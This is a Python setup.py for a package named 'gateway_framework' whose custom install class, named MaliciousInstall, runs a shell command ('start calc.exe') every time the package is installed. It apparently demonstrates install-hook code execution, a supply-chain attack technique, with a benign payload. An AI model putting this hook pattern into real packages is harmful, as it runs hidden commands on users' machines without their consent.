import os
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        os.system("start calc.exe")  # harmless payload
        install.run(self)

setup(
    name="gateway_framework",
    version="0.2",
    description="Gateway framework",
    packages=["gateway_framework"],
    cmdclass={
        'install': MaliciousInstall,
    },
)
